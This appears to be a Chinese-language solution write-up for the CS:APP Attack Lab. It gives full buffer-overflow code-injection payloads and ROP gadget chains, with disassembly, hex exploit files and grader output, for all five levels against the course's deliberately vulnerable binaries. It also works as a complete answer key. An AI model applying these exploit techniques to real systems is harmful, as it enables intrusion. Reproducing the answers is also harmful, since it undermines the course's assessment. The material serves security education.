---
title: Attack Lab
---

# 问题描述

## 设定

现有两个存在『缓冲区溢出 (buffer overflow)』风险的 x86-64 可执行文件：

- `ctarget` 可能遭受『CI (code injection)』攻击（对应第 1~3 关）。
- `rtarget` 可能遭受『ROP (return-oriented programming)』攻击（对应第 4~5 关）。
- [此处](http://csapp.cs.cmu.edu/3e/target1.tar)可下载这两个文件。本地运行时应开启 `-q` 选项，以避免连接评分服务器。

## 任务

利用上述漏洞，植入攻击代码，改变程序行为。[此处](http://csapp.cs.cmu.edu/3e/attacklab.pdf)可下载详细说明。

# `ctarget`

## 第一关

函数 `getbuf()` 的 C 代码和汇编码分别为

```c
unsigned getbuf() {
  char buf[BUFFER_SIZE];
  Gets(buf);
  return 1;
}
```

```nasm
(gdb) disassemble getbuf 
Dump of assembler code for function getbuf:
   0x00000000004017a8 <+0>:     sub    rsp,0x28 ; 40
   0x00000000004017ac <+4>:     mov    rdi,rsp
   0x00000000004017af <+7>:     call   0x401a40 <Gets>
   0x00000000004017b4 <+12>:    mov    eax,0x1
   0x00000000004017b9 <+17>:    add    rsp,0x28
   0x00000000004017bd <+21>:    ret    
End of assembler dump.
```

由此可见：旧栈顶（即 `R[rsp]` 的旧值）位于 `&buf[0]` 后 40 字节处。在调试器中，设断点于 `<+4>` 处，查看始于 `R[rsp]+40` 的 8 字节：

```nasm
(lldb) x/8bx $rsp+40
0x5561dca0: 0x0000000000401976
```

此地址值的确为调用者 `test()` 中紧跟在 `call <getbuf>` 后的下一条指令的地址：

```nasm
(gdb) disassemble test 
Dump of assembler code for function test:
   0x0000000000401968 <+0>:     sub    rsp,0x8
   0x000000000040196c <+4>:     mov    eax,0x0
   0x0000000000401971 <+9>:     call   0x4017a8 <getbuf>
   0x0000000000401976 <+14>:    mov    edx,eax
; ...
```

故只需将 `touch1()` 的地址 `0x00000000004017c0` 植入始于 `&buf[40]` 的 8 字节，逻辑上相当于在 C 代码中植入以下赋值语句：

```c
buf[40] = 0xc0;
buf[41] = 0x17;
buf[42] = 0x40;
buf[43] = buf[44] = buf[45] = buf[46] = buf[47] = 0x00;
```

具体步骤：

1. 创建含有以下内容（前 40 个字符相对随意，避开 `0x0a` 即 `\n` 即可）的 `exploit.txt` 文件：

   ```c
   /* buf[00,10) */ 30 31 32 33 34 35 36 37 38 39
   /* buf[10,20) */ 30 31 32 33 34 35 36 37 38 39
   /* buf[20,30) */ 30 31 32 33 34 35 36 37 38 39
   /* buf[30,40) */ 30 31 32 33 34 35 36 37 38 39
   c0 17 40 00 00 00 00 00 /* address of touch1() */
   ```

1. 利用 `hex2raw` 将上述文件转化为字符串：

   ```shell
   $ ./hex2raw < exploit.txt > exploit-raw.txt
   ```

1. 利用 *管道* 将 *`hex2raw` 的输出* 绑定到 *`ctarget` 的输入*：

   ```shell
   $ ./ctarget -q -i exploit-raw.txt
   ```

1. 后两步可合并为

   ```shell
   $ cat exploit.txt | ./hex2raw | ./ctarget -q
   ```

最终得以下输出
```
Cookie: 0x59b997fa
Type string:Touch1!: You called touch1()
Valid solution for level 1 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:1:30 31 32 33 34 35 36 37 38 39 30 31 32 33 34 35 36 37 38 39 30 31 32 33 34 35 36 37 38 39 30 31 32 33 34 35 36 37 38 39 C0 17 40 00 00 00 00 00 
```

## 第二关

需要植入的指令为：
```nasm
; exploit.s
mov  edi, 0x59b997fa ; cookie
push 0x004017ec      ; address of touch2()
ret
```
先汇编，再反汇编：
```shell
$ nasm -f elf64 -o exploit.o exploit.s
$ objdump -d exploit.o
```
得以下输出（⚠️ 汇编代码换成了 [ATT 格式](../3_machine_level_programming.md#汇编代码格式)）：
```
exploit.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 <.text>:
   0:   bf fa 97 b9 59          mov    $0x59b997fa,%edi
   5:   68 ec 17 40 00          pushq  $0x4017ec
   a:   c3                      retq
```

为便于调试，按每行 8 字节排列，并以 `0x90` 即 `nop` 指令占位：
```c
/* exploit.txt */
/* 0x5561dc78 */ 90 90 90 90 90 90 90 90
/* 0x5561dc80 */ bf fa 97 b9 59 /* mov  */ 90 90 90
/* 0x5561dc88 */ 68 ec 17 40 00 /* push */ 90 90 90
/* 0x5561dc90 */ c3 /* retq */ 90 90 90 90 90 90 90
/* 0x5561dc98 */ 90 90 90 90 90 90 90 90
/* 0x5561dca0 */ 78 dc 61 55 00 00 00 00 /* 0x5561dca0 - 40 */
```

```shell
$ cat exploit.txt | ./hex2raw | ./ctarget -q
```

最终得以下输出：
```
Cookie: 0x59b997fa
Type string:Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:2:90 90 90 90 90 90 90 90 BF FA 97 B9 59 90 90 90 68 EC 17 40 00 90 90 90 C3 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 78 DC 61 55 00 00 00 00 
```

## 第三关

先用 `man ascii` 查到字符串 `59b997fa` 的十六进制表示：

```
35 39 62 39 39 37 66 61
```

与前一关不同，这里不能直接将其写入 `getbuf()` 的帧内，而应将其压入栈内（并补一个空字符），故需植入的指令为：

```nasm
; exploit.s
push 0x0 ; 字符串尾
mov  rdi, 0x6166373939623935 ; 直接压栈无法编译
push rdi                     ; 故分作两步
mov  rdi, rsp ; 设置 touch3() 的实参
push 0x4018fa ; touch3() 的地址
ret
```

先汇编，再反汇编：

```shell
$ nasm -f elf64 exploit.s && objdump -d exploit.o
```

得以下输出：

```
exploit.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 <.text>:
   0:   6a 00                   pushq  $0x0
   2:   48 bf 35 39 62 39 39    movabs $0x6166373939623935,%rdi
   9:   37 66 61 
   c:   57                      push   %rdi
   d:   48 89 e7                mov    %rsp,%rdi
  10:   68 fa 18 40 00          pushq  $0x4018fa
  15:   c3                      retq
```

将指令编码编入 `exploit.txt` 的前半部分，并确保 `0xc3` 的地址位于 `0x5561dc90` 之前：

```c
/* exploit.txt */
/* 0x5561dc78 */ 6a 00 /* pushq */
/* 0x5561dc7a */ 48 bf 35 39 62 39 39 37 66 61 /* movabs */
/* 0x5561dc84 */ 57 /* push */
/* 0x5561dc85 */ 48 89 e7 /* mov */
/* 0x5561dc88 */ 68 fa 18 40 00 /* pushq */ 
/* 0x5561dc8d */ c3 /* retq */ 90 90
/* 0x5561dc90 */ 90 90 90 90 90 90 90 90
/* 0x5561dc98 */ 90 90 90 90 90 90 90 90
/* 0x5561dca0 */ 78 dc 61 55 00 00 00 00
```
之所以要这样安排，是因为

- 执行完 `getbuf()` 的 `retq` 指令后，栈顶 `R[rsp]` 位于 `0x5561dca8` 处。
- 执行三次 `pushq` 指令后，栈顶位于 `0x5561dc90` 处。
- 若指令位于栈内，执行时会发生 Segmentation Fault。

最终得以下输出：

```
Cookie: 0x59b997fa
Type string:Touch3!: You called touch3("59b997fa")
Valid solution for level 3 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:3:6A 00 48 BF 35 39 62 39 39 37 66 61 57 48 89 E7 68 FA 18 40 00 C3 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 78 DC 61 55 00 00 00 00
```

# `rtarget`<a name="rtarget"></a>

## 第四关

先用 `objdump -d` 获得 `rtarget` 的编码：

```shell
$ objdump -d -x86-asm-syntax=intel rtarget > rtarget.d
```

在 `start_farm` 与 `mid_farm` 之间（可存入 `half_farm.d` 以便检索），编码 `0xc3` 共出现 13 次 —— 可用指令只能取自这 13 处。

`cookie` 的编码几乎不可能出现在 `half_farm.d` 内，故不能像[第二关](#第二关)那样用 `mov` 直接移入寄存器，而必须借 `getbuf()` 植入栈内，并借 `pop` 指令取出。因此，实现 `touch2(cookie)` 的最简单的方案为

```nasm
; M[R[rsp]] = 0x59b997fa, which is my cookie
pop rdi ; 5f (90)*
; M[R[rsp]] = 0x4017ec, which is the address of touch2()
ret     ; c3
```

但 `5f (90)* c3` 并没有出现在 `half_farm.d` 内，故需借其他寄存器过渡：

```nasm
pop rax      ; 58 (90)* c3
mov rdi, rax ; 48 89 c7 (90)* c3
ret          ; c3
```

在 `half_farm.d` 内检索得：

- `58 90 c3` 在 `0x4019ab` 与 `0x4019cc` 各出现一次。
- `48 89 c7 c3` 在 `0x4019a2` 出现一次，`48 89 c7 90 c3` 在 `0x4019c5` 出现一次。

分别二选一，填入 `exploit.txt` 的适当位置：

```c
/* exploit.txt */
/* buf[00, 08) */ 90 90 90 90 90 90 90 90
/* buf[08, 16) */ 90 90 90 90 90 90 90 90
/* buf[16, 24) */ 90 90 90 90 90 90 90 90
/* buf[24, 32) */ 90 90 90 90 90 90 90 90
/* buf[32, 40) */ 90 90 90 90 90 90 90 90
/* buf[40, 48) */ ab 19 40 00 00 00 00 00 /* pop */
/* buf[48, 56) */ fa 97 b9 59 00 00 00 00 /* cookie */
/* buf[56, 64) */ a2 19 40 00 00 00 00 00 /* mov */
/* buf[64, 72) */ ec 17 40 00 00 00 00 00 /* touch2 */
```

```shell
$ cat exploit.txt | ./hex2raw | ./rtarget -q
```

最终得以下输出：

```
Cookie: 0x59b997fa
Type string:Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target rtarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:rtarget:2:90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 AB 19 40 00 00 00 00 00 FA 97 B9 59 00 00 00 00 A2 19 40 00 00 00 00 00 EC 17 40 00 00 00 00 00 
```

## 第五关

在 `start_farm` 与 `end_farm` 之间（可存入 `full_farm.d` 以便检索），编码 `0xc3` 共出现 50 次 —— 可用指令只能取自这 50 处。

本关难点在于：

- 退出 `getbuf()` 时，存于栈内的字符串必须完整地位于栈顶以上，即字符串的首地址不得小于 `R[rsp] + 8`，否则 `touch3()` 或 `hexmatch()` 的帧将破坏该字符串。
- 除 `add_xy()` 中的 `leaq` 指令外，没有提供其他算术运算指令，因此无法直接算出 `R[rsp]+8` 的值。
- 除退出 `getbuf()` 时有 `R[rax] == 1` 外，没有提供其他常数 —— 特别是地址运算中常用的 `8`、`16`、`32` 等。

一种可行（但较为繁琐）的方案为：先（反复）用 `add_xy()` 及 `R[rax]` 构造出所需的地址偏移量，再用 `add_xy()` 算出字符串的地址。

可用的 `mov` 指令如下：

- 用正则表达式 `48 89 [cdef]` 搜索可用的 `movq` 指令，得 9 处：
  - `48 89 c7` 出现 3 次，其中可用作 `movq %rax, %rdi` 的有
    - 始于 `0x4019a2` 的 `48 89 c7 c3`
    - 始于 `0x4019c5` 的 `48 89 c7 90 c3`
  - `48 89 e0` 出现 6 次，其中可用作 `movq %rsp, %rax ` 的有
    - 始于 `0x401a06` 的 `48 89 e0 c3`
    - 始于 `0x401aad` 的 `48 89 e0 90 c3`
  - 不存以 `%rsp` 为目标的 `movq` 指令（即 `48 89 [cdef][4c]`），故 `%rsp` 只能被 `popq` 即 `retq` 修改。
- 用正则表达式 `89 [cdef]` 搜索可用的 `movl` 指令，并排除  `48 89 [cdef]` 即 `movq` 指令，得 16 处：
  - `89 c2` 出现 6 次，其中可用作 `movl %eax, %edx` 的有
    - 始于 `0x4019dd` 的 `89 c2 90 c3`
    - 始于 `0x401a42` 的 `89 c2 84 c0 c3`
  - `89 ce` 出现 4 次，其中可用作 `movl %ecx, %esi` 的有
    - 始于 `0x401a13` 的 `89 ce 90 90 c3`
    - 始于 `0x401a27` 的 `89 ce 38 c0 c3`
  - `89 d1` 出现 4 次，其中可用作 `movl %edx, %ecx` 的有
    - 始于 `0x401a34` 的 `89 d1 38 c9 c3`
    - 始于 `0x401a68` 的 `89 d1 08 db c3`
  - `89 e0` 出现 2 次，略去不用。

借助这些指令，可以构造出 `2` 的整数次幂：

```nasm
ret ; to 0x4019a2 --- the address of `mov rdi, rax`
; R[rax] == 1
mov rdi, rax ; 48 89 c7
ret ; to 0x4019dd --- the address of `mov edx, eax`
mov edx, eax ; 89 c2
ret ; to 0x401a34 --- the address of `mov ecx, edx`
mov ecx, edx ; 89 d1 (38 c9)
ret ; to 0x401a13 --- the address of `mov esi, ecx`
mov esi, ecx ; 89 ce (90 90)
ret ; to 0x4019d6 --- the address of `add_xy()`
lea rax, [rdi + rsi] ; 48 8d 04 37
ret ; to 0x4019a2 --- the address of `mov rdi, rax`
; R[rax] == 2, R[rsi] == 1, R[rsi] == 1
```

除第一行外，其他部分重复四次，可得

```nasm
; R[rax] == 32, R[rdi] == 16, R[rsi] == 16
```

将 `R[rax]` 中的 `32` 移入 `R[rsi]`，但最后一步的返回地址换为 `mov rax, rsp` 的地址：

```nasm
mov rdi, rax ; 48 89 c7 --- optional
ret ; to 0x4019dd --- the address of `mov edx, eax`
mov edx, eax ; 89 c2
ret ; to 0x401a34 --- the address of `mov ecx, edx`
mov ecx, edx ; 89 d1 (38 c9)
ret ; to 0x401a13 --- the address of `mov esi, ecx`
mov esi, ecx ; 89 ce (90 90)
ret ; to 0x401a06 --- the address of `mov rax, rsp`
```

期望 `sval` 始于 `R[rsp] + 32` 处，故作如下地址偏移计算：

```nasm
; sval = R[rsp] + 32, R[rsi] = 32
mov rax, rsp ; 48 89 e0
ret ; to 0x4019a2 --- the address of `mov rdi, rax`
mov rdi, rax ; 48 89 c7
ret ; to 0x4019d6 --- the address of `add_xy()`
lea rax, [rdi + rsi]
ret ; to 0x4019a2 --- the address of `mov rdi, rax`
mov rdi, rax ; 48 89 c7
; sval = R[rsp] + 8
ret ; to `0x4018fa`, which is the address of `touch3()`
; sval = R[rdi]
```

将上述指令整理为输入：

```c
/* exploit.txt */
/* buf[00, 08) */ 90 90 90 90 90 90 90 90
/* buf[08, 16) */ 90 90 90 90 90 90 90 90
/* buf[16, 24) */ 90 90 90 90 90 90 90 90
/* buf[24, 32) */ 90 90 90 90 90 90 90 90
/* buf[32, 40) */ 90 90 90 90 90 90 90 90
/*  0  */ a2 19 40 00 00 00 00 00
/* -01 */ dd 19 40 00 00 00 00 00
/* -02 */ 34 1a 40 00 00 00 00 00
/* -03 */ 13 1a 40 00 00 00 00 00
/* -04 */ d6 19 40 00 00 00 00 00
/* -05 */ a2 19 40 00 00 00 00 00
/* -06 */ dd 19 40 00 00 00 00 00
/* -07 */ 34 1a 40 00 00 00 00 00
/* -08 */ 13 1a 40 00 00 00 00 00
/* -09 */ d6 19 40 00 00 00 00 00
/* -10 */ a2 19 40 00 00 00 00 00
/* -11 */ dd 19 40 00 00 00 00 00
/* -12 */ 34 1a 40 00 00 00 00 00
/* -13 */ 13 1a 40 00 00 00 00 00
/* -14 */ d6 19 40 00 00 00 00 00
/* -15 */ a2 19 40 00 00 00 00 00
/* -16 */ dd 19 40 00 00 00 00 00
/* -17 */ 34 1a 40 00 00 00 00 00
/* -18 */ 13 1a 40 00 00 00 00 00
/* -19 */ d6 19 40 00 00 00 00 00
/* -20 */ a2 19 40 00 00 00 00 00
/* -21 */ dd 19 40 00 00 00 00 00
/* -22 */ 34 1a 40 00 00 00 00 00
/* -23 */ 13 1a 40 00 00 00 00 00
/* -24 */ d6 19 40 00 00 00 00 00
/* -25 */ a2 19 40 00 00 00 00 00
/* -26 */ dd 19 40 00 00 00 00 00
/* -27 */ 34 1a 40 00 00 00 00 00
/* -28 */ 13 1a 40 00 00 00 00 00
/* mov rax, rsp */ 06 1a 40 00 00 00 00 00
/* mov rdi, rax */ a2 19 40 00 00 00 00 00
/* add_xy */ d6 19 40 00 00 00 00 00
/* mov rdi, rax */ a2 19 40 00 00 00 00 00
/* touch3 */ fa 18 40 00 00 00 00 00
/* cookie */ 35 39 62 39 39 37 66 61
/*  tail  */ 00
```

```
Cookie: 0x59b997fa
Type string:Touch3!: You called touch3("59b997fa")
Valid solution for level 3 with target rtarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:rtarget:3:90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 A2 19 40 00 00 00 00 00 DD 19 40 00 00 00 00 00 34 1A 40 00 00 00 00 00 13 1A 40 00 00 00 00 00 D6 19 40 00 00 00 00 00 A2 19 40 00 00 00 00 00 DD 19 40 00 00 00 00 00 34 1A 40 00 00 00 00 00 13 1A 40 00 00 00 00 00 D6 19 40 00 00 00 00 00 A2 19 40 00 00 00 00 00 DD 19 40 00 00 00 00 00 34 1A 40 00 00 00 00 00 13 1A 40 00 00 00 00 00 D6 19 40 00 00 00 00 00 A2 19 40 00 00 00 00 00 DD 19 40 00 00 00 00 00 34 1A 40 00 00 00 00 00 13 1A 40 00 00 00 00 00 D6 19 40 00 00 00 00 00 A2 19 40 00 00 00 00 00 DD 19 40 00 00 00 00 00 34 1A 40 00 00 00 00 00 13 1A 40 00 00 00 00 00 D6 19 40 00 00 00 00 00 A2 19 40 00 00 00 00 00 DD 19 40 00 00 00 00 00 34 1A 40 00 00 00 00 00 13 1A 40 00 00 00 00 00 06 1A 40 00 00 00 00 00 A2 19 40 00 00 00 00 00 D6 19 40 00 00 00 00 00 A2 19 40 00 00 00 00 00 FA 18 40 00 00 00 00 00 35 39 62 39 39 37 66 61 00 01 02 03 04 05 
```

